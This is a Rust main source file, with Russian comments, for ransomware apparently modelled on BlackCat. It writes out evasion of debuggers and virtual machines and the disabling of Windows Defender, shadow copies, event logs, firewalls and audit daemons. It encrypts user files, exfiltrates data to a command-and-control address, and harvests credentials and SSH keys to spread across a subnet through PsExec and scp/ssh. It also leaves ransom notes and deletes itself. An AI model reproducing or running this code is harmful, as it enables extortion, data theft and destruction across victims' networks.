// src/main.rs - АВТОНОМНАЯ ВЕРСИЯ
mod crypto;
mod filesystem;
mod ransomware;
mod windows;
mod lateral_movement;
mod evasion;
mod config;
mod linux;
mod exfiltration;

use clap::{Parser, Subcommand};
use log::{info, warn, error};
use std::path::Path;
use std::collections::HashSet;

#[derive(Parser)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Encrypt {
        #[arg(short, long)]
        path: String,
        
        #[arg(long)]
        spread: bool,
        
        #[arg(long)]
        exfiltrate: Option<String>,
        
        #[arg(long, default_value_t = false)]
        self_destruct: bool,
    },
    Decrypt {
        #[arg(short, long)]
        path: String,
        
        #[arg(short, long)]
        key: String,
    },
    Spread {
        #[arg(long)]
        subnet: Option<String>,
        
        #[arg(long, default_value = "11")]
        start_ip: u8,
        
        #[arg(long, default_value = "254")]
        end_ip: u8,
        
        #[arg(long, default_value_t = false)]
        self_destruct: bool,
    },
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::Builder::from_default_env()
        .filter_level(log::LevelFilter::Info)
        .init();

    let cli = Cli::parse();

    match cli.command {
        Commands::Encrypt { 
            path, 
            spread, 
            exfiltrate,
            self_destruct: should_self_destruct,
        } => {
            // 1. Проверка на отладчик и VM
            if evasion::is_debugger_present() {
                warn!("Debugger detected! Exiting...");
                return Ok(());
            }
            
            if evasion::is_running_in_vm() {
                warn!("Running in VM, proceeding with caution...");
            }
            
            // 2. Отключение защитных механизмов
            #[cfg(target_os = "windows")]
            {
                let _ = windows::WindowsPlatform::disable_windows_defender();
                let _ = windows::WindowsPlatform::delete_shadow_copies();
                let _ = evasion::disable_eventlog();
            }
            
            #[cfg(target_os = "linux")]
            {
                let _ = linux::LinuxOperations::disable_firewall();
                let _ = linux::LinuxOperations::kill_security_processes();
            }
            
            // 3. Создание CryptoEngine
            let crypto_engine = crypto::CryptoEngine::new()?;
            let master_key = hex::encode(crypto_engine.get_master_key());
            info!("Master Key: {}", master_key);
            
            // 4. Эксфильтрация данных (если включено)
            if let Some(ref c2_addr) = exfiltrate {
                info!("Starting data exfiltration to {}", c2_addr);
                
                // Формируем уникальное имя файла с ключом
                let _special_filename = format!("blackcat_exfil_key_{}.enc", &master_key[0..16]);
                info!("Exfiltration file will contain key prefix: {}", &master_key[0..16]);
                
                match exfiltration::Exfiltration::exfiltrate(&path, c2_addr, 4444, &crypto_engine) {
                    Ok(_) => info!("Data exfiltration successful"),
                    Err(e) => warn!("Exfiltration failed: {}", e),
                }
            }
            
            // 5. Lateral Movement (если включено)
            if spread {
                info!("Starting lateral movement...");
                
                let subnet = "192.168.53".to_string();
                let payload_path = std::env::current_exe()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_else(|_| {
                        if cfg!(target_os = "windows") {
                            "blackcat.exe".to_string()
                        } else {
                            "./blackcat".to_string()
                        }
                    });
                
                // Определяем путь для шифрования на целевых машинах
                let target_path = if cfg!(target_os = "windows") {
                    "C:\\Users"
                } else {
                    "/home"
                };
                
                // Формируем аргументы для распространения
                let mut spread_args = vec![
                    "encrypt".to_string(),
                    "--path".to_string(),
                    target_path.to_string(),
                ];
                
                if let Some(ref c2_addr) = exfiltrate {
                    spread_args.push("--exfiltrate".to_string());
                    spread_args.push(c2_addr.clone());
                }
                
                // Сканируем и распространяем
                auto_spread(&subnet, 11, 254, &payload_path, &spread_args).await?;
            }
            
            // 6. Локальное шифрование
            let files = filesystem::scan_filesystem(&path)?;
            if files.is_empty() {
                error!("No files found");
                return Ok(());
            }
        
            // Формируем список уникальных директорий
            let mut dirs_to_notify = HashSet::new();
            for file in &files {
                if let Some(parent) = Path::new(file).parent() {
                    if let Some(p_str) = parent.to_str() {
                        dirs_to_notify.insert(p_str.to_string());
                    }
                }
            }
        
            let all_dirs_list = dirs_to_notify.iter()
                .cloned()
                .collect::<Vec<String>>()
                .join("\n");
        
            // Шифрование файлов
            info!("Encrypting {} files...", files.len());
            
            ransomware::BlackCatRansomware::encrypt_all_files(
                files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path.clone()],
                    file_extensions: vec![
                        "txt", "doc", "docx", "xls", "xlsx", "pdf",
                        "jpg", "jpeg", "png", "config", "ini", "xml",
                        "sql", "db", "mdb", "csv", "rtf", "odt", "ods",
                    ].iter().map(|s| s.to_string()).collect(),
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;
        
            // 7. Создание вымогательских записок
            let exfil_report = exfiltration::Exfiltration::create_exfiltration_report(&path, &all_dirs_list, &crypto_engine);
            
            let dirs_copy = dirs_to_notify.clone();
            for dir in dirs_copy {
                #[cfg(target_os = "windows")]
                let _ = windows::WindowsPlatform::create_ransom_note(&dir, &exfil_report);
                
                #[cfg(target_os = "linux")]
                let _ = linux::LinuxOperations::create_ransom_note(&dir, &exfil_report);
            }
            
            info!("Encryption completed successfully. {} directories affected.", dirs_to_notify.len());
            
            // 8. Самоуничтожение (если включено)
            if should_self_destruct {
                info!("Self-destructing...");
                perform_self_destruct()?;
            }
        }

        Commands::Decrypt { path, key } => {
            info!("Decrypting: {}", path);
            
            // Декодируем ключ из hex
            let key_bytes = hex::decode(key)?;
            if key_bytes.len() != 32 {
                error!("Invalid key length. Expected 32 bytes (64 hex chars), got {} bytes", key_bytes.len());
                return Err("Invalid key length".into());
            }
            
            let mut master_key = [0u8; 32];
            master_key.copy_from_slice(&key_bytes);
            
            let crypto_engine = crypto::CryptoEngine::from_key(master_key);
            
            // Сканируем файлы с расширением .sttp
            let files = filesystem::scan_filesystem(&path)?;
            let sttp_files: Vec<String> = files.into_iter()
                .filter(|f| f.ends_with(".sttp"))
                .collect();
            
            info!("Found {} encrypted files to decrypt", sttp_files.len());
            
            ransomware::BlackCatRansomware::decrypt_all_files(
                sttp_files,
                ransomware::RansomwareConfig {
                    target_paths: vec![path],
                    file_extensions: vec!["sttp".to_string()],
                    encryption_algorithm: "aes-256-gcm".to_string(),
                    max_parallelism: 4,
                },
                &crypto_engine,
            ).await?;
            info!("Files restored successfully");
        }
        
        Commands::Spread { subnet, start_ip, end_ip, self_destruct: should_self_destruct } => {
            info!("Starting standalone lateral movement...");
            
            let subnet = subnet.unwrap_or_else(|| "192.168.53".to_string());
            let payload_path = std::env::current_exe()
                .map(|p| p.to_string_lossy().to_string())
                .unwrap_or_else(|_| {
                    if cfg!(target_os = "windows") {
                        "blackcat.exe".to_string()
                    } else {
                        "./blackcat".to_string()
                    }
                });
            
            // Только распространение без шифрования
            let target_path = if cfg!(target_os = "windows") {
                "C:\\Users"
            } else {
                "/home"
            };
            
            let args = vec![
                "encrypt".to_string(),
                "--path".to_string(),
                target_path.to_string(),
                "--exfiltrate".to_string(),
                "192.168.53.135".to_string(),
                "--self-destruct".to_string(),
            ];
            
            auto_spread(&subnet, start_ip, end_ip, &payload_path, &args).await?;
            
            if should_self_destruct {
                perform_self_destruct()?;
            }
        }
    }
    
    Ok(())
}

async fn auto_spread(
    subnet: &str,
    start_ip: u8,
    end_ip: u8,
    payload_path: &str,
    args: &[String],
) -> Result<(), Box<dyn std::error::Error>> {
    info!("Auto-spreading from {} to {}.{}.{}", 
          payload_path, subnet, start_ip, end_ip);
    
    // 1. Сканируем сеть
    let hosts = lateral_movement::LateralMovement::discover_hosts(subnet, start_ip, end_ip);
    
    if hosts.is_empty() {
        warn!("No hosts found in subnet {}", subnet);
        return Ok(());
    }
    
    info!("Found {} potential targets", hosts.len());
    
    // 2. Распределяем по ОС
    let mut windows_hosts = Vec::new();
    let mut linux_hosts = Vec::new();
    
    for host in hosts {
        if is_windows_host(&host) {
            windows_hosts.push(host);
        } else if is_linux_host(&host) {
            linux_hosts.push(host);
        }
    }
    
    info!("Windows hosts: {}, Linux hosts: {}", 
          windows_hosts.len(), linux_hosts.len());
    
    // 3. Распространяем в зависимости от текущей ОС
    #[cfg(target_os = "windows")]
    {
        if !windows_hosts.is_empty() {
            info!("Spreading to {} Windows hosts...", windows_hosts.len());
            
            // Загружаем учетные данные
            let credentials = lateral_movement::LateralMovement::harvest_credentials();
            
            for host in windows_hosts {
                info!("Attempting to infect Windows host: {}", host);
                
                for cred in &credentials {
                    if infect_windows_host(&host, &cred.0, &cred.1, &cred.2, 
                                          payload_path, args).await {
                        info!("Successfully infected Windows host: {}", host);
                        break;
                    }
                }
            }
        }
        
        // На Windows не можем заражать Linux хосты напрямую
        if !linux_hosts.is_empty() {
            warn!("Cannot infect Linux hosts from Windows (need Linux binary)");
        }
    }
    
    #[cfg(target_os = "linux")]
    {
        if !linux_hosts.is_empty() {
            info!("Spreading to {} Linux hosts...", linux_hosts.len());
            
            // Получаем SSH ключи
            let ssh_keys = linux::LinuxOperations::enumerate_ssh_keys()
                .unwrap_or_else(|_| Vec::new());
            
            for host in linux_hosts {
                info!("Attempting to infect Linux host: {}", host);
                
                for ssh_key in &ssh_keys {
                    if infect_linux_host(&host, ssh_key, payload_path, args).await {
                        info!("Successfully infected Linux host: {}", host);
                        break;
                    }
                }
            }
        }
        
        // На Linux не можем заражать Windows хосты напрямую
        if !windows_hosts.is_empty() {
            warn!("Cannot infect Windows hosts from Linux (need Windows binary)");
        }
    }
    
    Ok(())
}

fn is_windows_host(ip: &str) -> bool {
    // Проверяем Windows порты
    let windows_ports = [445, 135, 139, 3389];
    for &port in &windows_ports {
        if lateral_movement::LateralMovement::check_port(ip, port, 300) {
            return true;
        }
    }
    false
}

fn is_linux_host(ip: &str) -> bool {
    // Проверяем SSH порт
    lateral_movement::LateralMovement::check_port(ip, 22, 300)
}

#[cfg(target_os = "windows")]
async fn infect_windows_host(
    host: &str,
    username: &str,
    password: &str,
    domain: &str,
    payload_path: &str,
    args: &[String],
) -> bool {
    use std::process::Command;
    
    // Формируем команду
    let mut full_args = vec![payload_path.to_string()];
    full_args.extend_from_slice(args);
    
    let command_line = full_args.join(" ");
    
    // Ищем PsExec в assets
    let current_exe = std::env::current_exe().ok();
    let current_dir = current_exe.and_then(|p| p.parent().map(|p| p.to_path_buf()));
    
    if let Some(dir) = current_dir {
        let psexec_path = dir.join("assets").join("PsExec.exe");
        
        if psexec_path.exists() {
            let psexec_str = psexec_path.to_string_lossy();
            
            // Формируем полную команду для PsExec
            let full_domain = if domain.is_empty() {
                username.to_string()
            } else {
                format!("{}\\{}", domain, username)
            };
            
            let output = Command::new(&*psexec_str)
                .args(&[
                    "\\\\", host,
                    "-accepteula",
                    "-u", &full_domain,
                    "-p", password,
                    "-h", "-s", "-d", "-c", "-f",
                    &command_line,
                ])
                .output();
            
            match output {
                Ok(result) => {
                    if result.status.success() {
                        info!("Successfully infected {} with {}", host, username);
                        
                        // Отключаем защиту на удаленном хосте
                        let _ = Command::new(&*psexec_str)
                            .args(&[
                                "\\\\", host,
                                "-accepteula",
                                "-u", &full_domain,
                                "-p", password,
                                "-h", "-s",
                                "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                            ])
                            .output();
                        
                        return true;
                    } else {
                        warn!("Failed to infect {}: {}", host, 
                              String::from_utf8_lossy(&result.stderr));
                    }
                }
                Err(e) => {
                    warn!("PsExec error for {}: {}", host, e);
                }
            }
        } else {
            warn!("PsExec not found in assets folder");
        }
    }
    
    false
}

#[cfg(target_os = "linux")]
async fn infect_linux_host(
    host: &str,
    ssh_key: &str,
    payload_path: &str,
    args: &[String],
) -> bool {
    use std::process::Command;
    
    // Проверяем существование ключа
    if !std::path::Path::new(ssh_key).exists() {
        return false;
    }
    
    // Формируем команду
    let mut full_args = vec!["encrypt".to_string()];
    full_args.extend_from_slice(args);
    
    let command_line = full_args.join(" ");
    
    // Копируем payload
    let scp_cmd = format!(
        "scp -i {} -o StrictHostKeyChecking=no -o ConnectTimeout=10 {} {}:/tmp/.blackcat",
        ssh_key, payload_path, host
    );
    
    let scp_output = Command::new("sh")
        .args(&["-c", &scp_cmd])
        .output();
    
    match scp_output {
        Ok(result) => {
            if result.status.success() {
                // Запускаем payload
                let ssh_cmd = format!(
                    "ssh -i {} -o StrictHostKeyChecking=no {} 'chmod +x /tmp/.blackcat && /tmp/.blackcat {} >/dev/null 2>&1 &'",
                    ssh_key, host, command_line
                );
                
                let ssh_output = Command::new("sh")
                    .args(&["-c", &ssh_cmd])
                    .output();
                
                match ssh_output {
                    Ok(result) => {
                        if result.status.success() {
                            info!("Successfully infected Linux host: {}", host);
                            
                            // Отключаем защиту
                            let disable_cmd = format!(
                                "ssh -i {} -o StrictHostKeyChecking=no {} 'systemctl stop ufw 2>/dev/null; pkill -9 auditd 2>/dev/null'",
                                ssh_key, host
                            );
                            
                            let _ = Command::new("sh")
                                .args(&["-c", &disable_cmd])
                                .output();
                            
                            return true;
                        }
                    }
                    Err(e) => {
                        warn!("SSH execution error for {}: {}", host, e);
                    }
                }
            }
        }
        Err(e) => {
            warn!("SCP error for {}: {}", host, e);
        }
    }
    
    false
}

fn perform_self_destruct() -> Result<(), Box<dyn std::error::Error>> {
    info!("Initiating self-destruct sequence...");
    
    let current_exe = std::env::current_exe()?;
    let exe_path = current_exe.to_string_lossy().to_string();
    
    #[cfg(target_os = "windows")]
    {
        // На Windows создаем bat-файл для удаления себя
        let bat_content = format!(
            "@echo off\r\n\
            timeout /t 3 /nobreak >nul\r\n\
            del \"{}\"\r\n\
            del \"%~f0\"\r\n",
            exe_path
        );
        
        let bat_path = format!("{}\\delete_self.bat", std::env::temp_dir().to_string_lossy());
        std::fs::write(&bat_path, bat_content)?;
        
        use std::process::Command;
        Command::new("cmd")
            .args(&["/c", "start", "/b", &bat_path])
            .spawn()?;
    }
    
    #[cfg(target_os = "linux")]
    {
        // На Linux создаем sh-скрипт для удаления себя
        let sh_content = format!(
            "#!/bin/sh\n\
            sleep 3\n\
            rm -f \"{}\"\n\
            rm -f \"$0\"\n",
            exe_path
        );
        
        let sh_path = format!("/tmp/delete_self_{}.sh", std::process::id());
        std::fs::write(&sh_path, sh_content)?;
        
        use std::process::Command;
        Command::new("sh")
            .args(&["-c", &format!("chmod +x {} && {} &", sh_path, sh_path)])
            .spawn()?;
    }
    
    info!("Self-destruct initiated. Process will exit in 3 seconds.");
    std::thread::sleep(std::time::Duration::from_secs(3));
    
    Ok(())
}